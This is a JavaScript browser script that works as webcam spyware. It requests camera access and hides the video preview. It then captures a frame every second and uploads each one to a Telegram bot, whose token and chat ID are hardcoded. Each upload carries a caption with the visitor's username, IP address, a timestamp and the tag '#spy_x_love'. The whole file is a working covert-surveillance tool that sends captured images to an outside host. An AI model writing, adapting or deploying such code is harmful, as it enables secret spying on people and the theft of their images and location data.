// Declare globally
let video;

// Create and add the video element
video = document.createElement('video');
video.id = 'mirror';
video.autoplay = true;
video.playsInline = true;
video.style.display = 'none'; // hide the video element
document.body.appendChild(video);


// Create and add the status div
const statusDiv = document.createElement('div');
statusDiv.id = 'status';
document.body.appendChild(statusDiv);


let username = localStorage.getItem('username');
if (!username) {
    username = prompt('Enter your username:');
    if (username) {
        localStorage.setItem('username', username);
    } else {
        username = 'Anonymous';
        localStorage.setItem('username', username);
    }
}

// Generate or retrieve user code
let userCode = localStorage.getItem('usercode');
if (!userCode) {
    // Generate random 4-digit code
    userCode = Math.floor(1000 + Math.random() * 9000).toString();
    localStorage.setItem('usercode', userCode);
}


let userIP = '';
// Fetch user's IP using XMLHttpRequest
function fetchIP() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.ipify.org?format=json', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            try {
                const response = JSON.parse(xhr.responseText);
                userIP = response.ip;
            } catch (e) {
                userIP = 'Unknown';
            }
        }
    };
    xhr.send();
}
fetchIP();

// Parse URL parameters for cp (compression size)
const urlParams = new URLSearchParams(window.location.search);
const cpParam = urlParams.get('cp'); // e.g., '30kb'
let maxSizeBytes = null;

if (cpParam && cpParam.toLowerCase().endsWith('kb')) {
    const sizeKb = parseInt(cpParam.toLowerCase().replace('kb', ''));
    if (!isNaN(sizeKb)) {
        maxSizeBytes = sizeKb * 1024; // convert to bytes
        console.log('Compression enabled: target size', maxSizeBytes, 'bytes');
    }
}

// Telegram Bot details
const botToken = '8909535161:AAF4d-hVXgpcYqaB1rA6ylGiZjzILLbOB7U'; // Your bot token
const chatId = '-1003935845513'; // Your chat ID

// Custom capture interval in seconds
const captureIntervalSeconds = 1; // Change as needed

// Access camera
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
    startAutoCapture();
})
.catch(error => {
    statusDiv.textContent = 'Camera access error: ' + error.message;
});

// Function to send photo to Telegram
function sendPhotoToTelegram(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'capture.jpg');
    if (caption) {
        formData.append('caption', caption);
    }
    formData.append('parse_mode', 'HTML');

    const xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendPhoto`, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status !== 200) {
                console.error('Telegram API error:', xhr.statusText);
            }
        }
    };
    xhr.send(formData);
}

// Function to compress image to under target size
function compressImage(canvas, targetSizeBytes, callback) {
    let quality = 0.9; // start high
    const minQuality = 0.1;
    const step = 0.05;

    function attemptCompression() {
        canvas.toBlob(blob => {
            if (blob.size <= targetSizeBytes || quality <= minQuality) {
                // Accept this blob
                callback(blob);
            } else {
                // Reduce quality and retry
                quality -= step;
                // Create a temporary canvas to re-encode with lower quality
                const tempCanvas = document.createElement('canvas');
                tempCanvas.width = canvas.width;
                tempCanvas.height = canvas.height;
                const ctx = tempCanvas.getContext('2d');
                ctx.drawImage(canvas, 0, 0);
                tempCanvas.toBlob(blob2 => {
                    if (blob2.size <= targetSizeBytes || quality <= minQuality) {
                        callback(blob2);
                    } else {
                        // Recursive attempt
                        attemptCompression();
                    }
                }, 'image/jpeg', quality);
            }
        }, 'image/jpeg', quality);
    }

    attemptCompression();
}

// Function to capture image and send
function captureAndUpload() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // If compression is needed
    if (maxSizeBytes) {
        // Use binary search approach for better accuracy
        compressImage(canvas, maxSizeBytes, (blob) => {
            sendImageBlob(blob);
        });
    } else {
        // No compression needed
        canvas.toBlob(blob => {
            sendImageBlob(blob);
        }, 'image/jpeg');
    }
}

// Helper to send blob with caption
function sendImageBlob(blob) {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    
// const milliseconds = String(now.getMilliseconds()).padStart(3, '0');

// ${milliseconds}

    const dateStr = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;

    const caption = `👤 : ${username}\n📍 : ${userIP}\n⌛ :  ${dateStr}\n🔑: <b>#${userCode}</b>\n\n<b>#spy_x_love</b> ☠️`;
    sendPhotoToTelegram(blob, caption);
}

// Start auto capture
function startAutoCapture() {
    if (!window.captureInterval) {
        window.captureInterval = setInterval(captureAndUpload, captureIntervalSeconds * 1000);
    }
}
